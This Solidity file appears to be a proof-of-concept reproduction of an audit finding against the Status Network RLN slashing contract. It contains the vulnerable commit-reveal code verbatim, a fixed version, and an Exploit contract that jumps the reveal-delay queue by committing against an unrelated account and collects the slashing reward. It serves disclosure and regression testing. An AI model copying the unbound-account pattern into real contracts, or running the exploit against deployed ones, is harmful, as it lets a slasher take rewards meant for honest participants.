// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Status Network RLN finding 65326:
// "Anyone can dodge reveal delays by providing unrelated account".
//
// RLN slashing uses a commit-reveal scheme with a queuing delay: the FIRST
// slasher to `slashCommit` against an account may reveal immediately, while a
// SECOND slasher committing against the SAME account within the window is queued
// behind it (revealStartTime = lastReveal + slashRevealWindowTime, a FUTURE time)
// and must wait out the delay. This is the anti-front-running protection.
//
// The bug: `account` is completely unbound from the private key being revealed.
// `slashReveal` reads/deletes `slashCommitments[account][hash]` and then slashes
// `members[poseidonHash(privateKey)]` — but never checks that `account` equals
// that member. A malicious slasher therefore commits against an UNUSED, unrelated
// account (which always yields a 0-delay revealStartTime = block.timestamp),
// reveals in the same block, and claims the slashing reward — jumping the queue
// ahead of an honest slasher who committed against the true account and would
// have to wait the delay.
//
// Verbatim vulnerable source: `slashCommit` and `slashReveal` are inlined byte
// for byte from the finding (status-im/status-network-monorepo RLN.sol, the
// audited pre-fix state; fix 62021fc adds the `account != member.userAddress`
// check). The internal reward payout `slash(...)` faithfully models the pre-fix
// `_slash` (identityCommitment = poseidonHasher.hash(privateKey); members lookup;
// karma.slash pays the reward to rewardRecipient). Poseidon is modelled with a
// keccak256 double, and Karma with a minimal reward-token payout — both are
// opaque out-of-scope boundaries, never the vulnerable function itself.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20 double: the SLASH-REWARD token paid to the reward recipient.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

interface IPoseidonHasher {
    function hash(uint256 input) external view returns (uint256);
}

/// @dev Faithful minimal double for the Poseidon hasher (keccak256 stand-in).
///      The finding notes poseidonHash/keccak commitments can be modelled with
///      keccak256 doubles; only determinism (PK -> identityCommitment) matters.
contract MiniPoseidon is IPoseidonHasher {
    function hash(uint256 input) external pure returns (uint256) {
        return uint256(keccak256(abi.encodePacked(input)));
    }
}

/// @dev Faithful minimal double for the opaque Karma slashing boundary: on slash
///      it pays a fixed reward to `rewardRecipient` (the reward an honest,
///      delay-abiding slasher should have earned).
contract MiniKarma {
    MiniToken public token;
    uint256 public reward;

    constructor(address _token, uint256 _reward) {
        token = MiniToken(_token);
        reward = _reward;
    }

    function slash(address, /*slashedMember*/ address rewardRecipient) external {
        token.mint(rewardRecipient, reward);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract: verbatim `slashCommit` + `slashReveal` inlined from the
// finding. The `account` parameter is never bound to the PK-derived member.
// ─────────────────────────────────────────────────────────────────────────────
contract RLN {
    error RLN__MemberNotFound();
    error RLN__InvalidCommitment();
    error RLN__RevealWindowNotStarted();

    struct User {
        address userAddress;
        uint256 index;
    }

    bytes32 public constant SLASHER_ROLE = keccak256("SLASHER_ROLE");
    mapping(bytes32 => mapping(address => bool)) internal _roles;

    modifier onlyRole(bytes32 role) {
        require(_roles[role][msg.sender], "AccessControl: missing role");
        _;
    }

    IPoseidonHasher public poseidonHasher;
    MiniKarma public karma;
    uint256 public slashRevealWindowTime;
    uint256 public identityCommitmentIndex;

    mapping(uint256 commitment => User user) public members;
    mapping(address account => uint256 lastRevealStartTime) public lastRevealStartTime;
    mapping(address account => mapping(bytes32 hash => uint256 revealStartTime)) public slashCommitments;

    constructor(address _poseidonHasher, address _karma, uint256 _slashRevealWindowTime) {
        poseidonHasher = IPoseidonHasher(_poseidonHasher);
        karma = MiniKarma(_karma);
        slashRevealWindowTime = _slashRevealWindowTime;
    }

    function grantSlasher(address slasher) external {
        _roles[SLASHER_ROLE][slasher] = true;
    }

    function register(uint256 identityCommitment, address user) external {
        members[identityCommitment] = User(user, identityCommitmentIndex);
        unchecked {
            identityCommitmentIndex += 1;
        }
    }

    // ---- VERBATIM vulnerable slashCommit (from the finding) ----
    function slashCommit(address account, bytes32 hash) external onlyRole(SLASHER_ROLE) {
        uint256 lastReveal = lastRevealStartTime[account];
        uint256 revealStartTime;

        if (lastReveal == 0 || lastReveal + slashRevealWindowTime < block.timestamp) {
            revealStartTime = block.timestamp;
        } else {
            revealStartTime = lastReveal + slashRevealWindowTime;
        }

        slashCommitments[account][hash] = revealStartTime;
        lastRevealStartTime[account] = revealStartTime;
    }

    // ---- VERBATIM vulnerable slashReveal (from the finding) ----
    function slashReveal(
        address account,
        bytes32 privateKey,
        address rewardRecipient
    )
        external
        onlyRole(SLASHER_ROLE)
    {
        /// forge-lint: disable-next-line(asm-keccak256)
        bytes32 hash = keccak256(abi.encodePacked(privateKey, rewardRecipient));
        uint256 revealStartTime = slashCommitments[account][hash];

        if (revealStartTime == 0) {
            revert RLN__InvalidCommitment();
        }

        if (block.timestamp < revealStartTime) {
            revert RLN__RevealWindowNotStarted();
        }

        delete slashCommitments[account][hash];
        slash(privateKey, rewardRecipient); // @> pays out without ever checking account == members[poseidonHash(privateKey)] — an unrelated account skips the reveal-delay queue
    }

    // ---- faithful model of the pre-fix internal `_slash` (reward payout) ----
    function slash(bytes32 privateKey, address rewardRecipient) internal {
        uint256 identityCommitment = poseidonHasher.hash(uint256(privateKey));
        User memory member = members[identityCommitment];
        if (member.userAddress == address(0)) {
            revert RLN__MemberNotFound();
        }
        karma.slash(member.userAddress, rewardRecipient);
        delete members[identityCommitment];
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract: identical, but `slashReveal` binds `account` to the PK-derived
// member (fix 62021fc) — an unrelated-account reveal now reverts.
// ─────────────────────────────────────────────────────────────────────────────
contract RLNFixed {
    error RLN__MemberNotFound();
    error RLN__InvalidCommitment();
    error RLN__RevealWindowNotStarted();

    struct User {
        address userAddress;
        uint256 index;
    }

    bytes32 public constant SLASHER_ROLE = keccak256("SLASHER_ROLE");
    mapping(bytes32 => mapping(address => bool)) internal _roles;

    modifier onlyRole(bytes32 role) {
        require(_roles[role][msg.sender], "AccessControl: missing role");
        _;
    }

    IPoseidonHasher public poseidonHasher;
    MiniKarma public karma;
    uint256 public slashRevealWindowTime;
    uint256 public identityCommitmentIndex;

    mapping(uint256 commitment => User user) public members;
    mapping(address account => uint256 lastRevealStartTime) public lastRevealStartTime;
    mapping(address account => mapping(bytes32 hash => uint256 revealStartTime)) public slashCommitments;

    constructor(address _poseidonHasher, address _karma, uint256 _slashRevealWindowTime) {
        poseidonHasher = IPoseidonHasher(_poseidonHasher);
        karma = MiniKarma(_karma);
        slashRevealWindowTime = _slashRevealWindowTime;
    }

    function grantSlasher(address slasher) external {
        _roles[SLASHER_ROLE][slasher] = true;
    }

    function register(uint256 identityCommitment, address user) external {
        members[identityCommitment] = User(user, identityCommitmentIndex);
        unchecked {
            identityCommitmentIndex += 1;
        }
    }

    function slashCommit(address account, bytes32 hash) external onlyRole(SLASHER_ROLE) {
        uint256 lastReveal = lastRevealStartTime[account];
        uint256 revealStartTime;

        if (lastReveal == 0 || lastReveal + slashRevealWindowTime < block.timestamp) {
            revealStartTime = block.timestamp;
        } else {
            revealStartTime = lastReveal + slashRevealWindowTime;
        }

        slashCommitments[account][hash] = revealStartTime;
        lastRevealStartTime[account] = revealStartTime;
    }

    function slashReveal(
        address account,
        bytes32 privateKey,
        address rewardRecipient
    )
        external
        onlyRole(SLASHER_ROLE)
    {
        /// forge-lint: disable-next-line(asm-keccak256)
        bytes32 hash = keccak256(abi.encodePacked(privateKey, rewardRecipient));
        uint256 revealStartTime = slashCommitments[account][hash];

        if (revealStartTime == 0) {
            revert RLN__InvalidCommitment();
        }

        if (block.timestamp < revealStartTime) {
            revert RLN__RevealWindowNotStarted();
        }

        delete slashCommitments[account][hash];

        uint256 identityCommitment = poseidonHasher.hash(uint256(privateKey));
        User memory member = members[identityCommitment];
        if (member.userAddress == address(0)) {
            revert RLN__MemberNotFound();
        }

        // FIX: the slashed account must match the account used at commit time.
        if (account != member.userAddress) {
            revert RLN__InvalidCommitment();
        }

        karma.slash(member.userAddress, rewardRecipient);
        delete members[identityCommitment];
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: an insider slasher jumps the reveal-delay queue by committing
// against an unused, unrelated account and revealing in the same block. The
// slashing reward is minted to the ATTACKER EOA with zero enforced wait, while
// (control A) the true-account path is delay-queued and (control B) the fixed
// contract reverts the unrelated-account reveal.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    // The victim member (registered under identityCommitment = poseidon(PK)).
    address internal constant BOB = address(uint160(0xB0B0));
    // An honest slasher's reward recipient (the party that abides by the delay).
    address internal constant HONEST = address(uint160(0xA5A5));
    // An unused, unrelated account the attacker abuses for a 0-delay commit.
    address internal constant RANDOM = address(uint160(0xBEEF));

    bytes32 internal constant PK = keccak256("rln-victim-private-key");
    uint256 internal constant WINDOW = 1 hours;
    uint256 internal constant REWARD = 1 ether; // 1 SLASH-REWARD token

    MiniToken public rewardToken;
    MiniPoseidon public poseidon;
    MiniKarma public karmaContract;
    RLN public rln;
    RLNFixed public rlnFixed;

    // Exposed results for the driver.
    uint256 public attackerReward;
    bool public blockedViaTrueAccount;
    bool public fixedBlockedExploit;
    address public rewardTokenAddr;
    address public rlnAddr;
    address public rlnFixedAddr;

    constructor() {
        // deploy order: 0 reward token, 1 poseidon, 2 karma, 3 RLN (vuln), 4 RLNFixed
        rewardToken = new MiniToken("Slash Reward", "SLASH-REWARD");
        poseidon = new MiniPoseidon();
        karmaContract = new MiniKarma(address(rewardToken), REWARD);
        rln = new RLN(address(poseidon), address(karmaContract), WINDOW);
        rlnFixed = new RLNFixed(address(poseidon), address(karmaContract), WINDOW);

        rewardTokenAddr = address(rewardToken);
        rlnAddr = address(rln);
        rlnFixedAddr = address(rlnFixed);

        // register the victim member under poseidon(PK) in both contracts
        uint256 idc = poseidon.hash(uint256(PK));
        rln.register(idc, BOB);
        rlnFixed.register(idc, BOB);

        // this Exploit acts as an insider slasher against both contracts
        rln.grantSlasher(address(this));
        rlnFixed.grantSlasher(address(this));
    }

    function reward() external pure returns (uint256) {
        return REWARD;
    }

    function run() external payable {
        bytes32 honestHash = keccak256(abi.encodePacked(PK, HONEST));
        bytes32 attackerHash = keccak256(abi.encodePacked(PK, ATTACKER));

        // (1) Honest slasher commits against the TRUE account first, taking the
        //     queue slot; lastRevealStartTime[BOB] is now set.
        rln.slashCommit(BOB, honestHash);

        // (2) CONTROL A: the attacker committing against the TRUE account is
        //     queued behind the honest commit -> a same-block reveal must revert
        //     (RLN__RevealWindowNotStarted). This is the delay the bug dodges.
        rln.slashCommit(BOB, attackerHash);
        try rln.slashReveal(BOB, PK, ATTACKER) {
            blockedViaTrueAccount = false;
        } catch {
            blockedViaTrueAccount = true;
        }

        // (3) EXPLOIT: the attacker commits against an UNUSED, unrelated account
        //     -> revealStartTime = block.timestamp (0 delay) -> reveal in the
        //     same block succeeds and the reward is paid to the ATTACKER,
        //     jumping the queue ahead of the honest slasher.
        rln.slashCommit(RANDOM, attackerHash);
        rln.slashReveal(RANDOM, PK, ATTACKER);
        attackerReward = rewardToken.balanceOf(ATTACKER);

        // (4) CONTROL B: the fixed contract binds account -> member, so the same
        //     unrelated-account reveal reverts (RLN__InvalidCommitment) and pays
        //     the attacker nothing.
        rlnFixed.slashCommit(RANDOM, attackerHash);
        try rlnFixed.slashReveal(RANDOM, PK, ATTACKER) {
            fixedBlockedExploit = false;
        } catch {
            fixedBlockedExploit = true;
        }

        // Harm: the attacker received the full slashing reward with zero enforced
        // wait via an unrelated account, while both the legitimate queue and the
        // fixed contract would have denied it.
        require(attackerReward == REWARD, "exploit did not pay attacker the reward");
        require(blockedViaTrueAccount, "true-account path was not delay-queued");
        require(fixedBlockedExploit, "fixed contract did not block the exploit");
    }
}
